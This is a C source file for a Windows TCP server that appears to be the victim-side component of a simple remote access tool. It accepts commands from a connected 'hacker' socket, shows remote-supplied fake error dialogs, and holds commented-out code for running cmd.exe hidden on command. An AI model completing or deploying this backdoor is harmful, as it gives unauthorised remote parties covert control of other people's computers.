#include <tchar.h> // _tprintf
#include <conio.h> // clrscr

#include "Server.h"
#include "Tools.h"

#pragma comment(lib, "Ws2_32.lib")

SOCKET InitServer()
{	
	WSADATA wsaData;
	INT     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		_tprintf(TEXT("WSAStartup failed with error: %d\n"), iResult);

		return INVALID_SOCKET;
	}
	_tprintf(TEXT("Startup finished\n"));

	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listen_sock == INVALID_SOCKET)
	{
		_tprintf(TEXT("socket failed with error: %ld\n"), WSAGetLastError());

		WSACleanup();

		return INVALID_SOCKET;
	}

	SOCKADDR_IN addr_sock;
	addr_sock.sin_family       = AF_INET;
	addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
	addr_sock.sin_port        = htons(DEFAULT_PORT);
	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(addr_sock)) == SOCKET_ERROR)
	{
		_tprintf(TEXT("bind failed with error: %d\n"), WSAGetLastError());

		closesocket(listen_sock);
		WSACleanup();

		return INVALID_SOCKET;
	}
	_tprintf(TEXT("Binding socket finished\n"));

	if (listen(listen_sock, 1) == SOCKET_ERROR)
	{
		_tprintf(TEXT("listen failed with error: %d\n"), WSAGetLastError());

		closesocket(listen_sock);
		WSACleanup();

		return INVALID_SOCKET;
	}
	_tprintf(TEXT("Socket started to listen\n"));

	return listen_sock;
}

VOID RunServer(SOCKET listen_sock)
{
	ClearConsole();

	char   cmd[CMD_LENGTH + 1] = { 0 }, // (cmd + space) + '\0'
		  args[ARGS_LENGTH]    = { 0 };
	while (TRUE)
	{
		_tprintf(TEXT("Waiting for the client\n"));

		SOCKET hacker_sock = accept(listen_sock, NULL, NULL);
		if (hacker_sock == INVALID_SOCKET)
		{
			_tprintf(TEXT("accept failed with error: %d\n"), WSAGetLastError());

			return;
		}

		_tprintf(TEXT("Connected\n"));
		while (TRUE)
		{
			int bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
			recv(hacker_sock, args, ARGS_LENGTH, 0);

			if (!bytes || bytes == SOCKET_ERROR)
				break;

			_tprintf(TEXT("cmd:'%hs', args:'%hs'\n"), cmd, args);
			switch (cmd[0])
			{
			case MESSAGE: {
				TCHAR buffer[ARGS_LENGTH] = { 0 };
				_stprintf_s(buffer, ARGS_LENGTH, TEXT("%hs"), args);
				MessageBoxEx(NULL, buffer, TEXT("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
				break;
			}

			case EXECUTE: {
				//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
				//strcat_s(buf, ARGS_LENGTH + 3, args);
				// SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
				// shell.fMask = SEE_MASK_NOCLOSEPROCESS;
				// shell.lpFile = "cmd.exe";
				// shell.lpParameters = "ipconfig > a.txt";
				// shell.nShow = SW_HIDE;
				// ShellExecuteEx(&shell);
				// WaitForSingleObject(shell.hProcess, INFINITE);
				//ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
				break; 
			}

			default:
				break;
			}	

			// send(hacker_sock, success, strlen(success), 0);
		}

		closesocket(hacker_sock);

		_tprintf(TEXT("Client disconnected\n"));
		SleepEx(5000, FALSE);
		ClearConsole();
	}
}
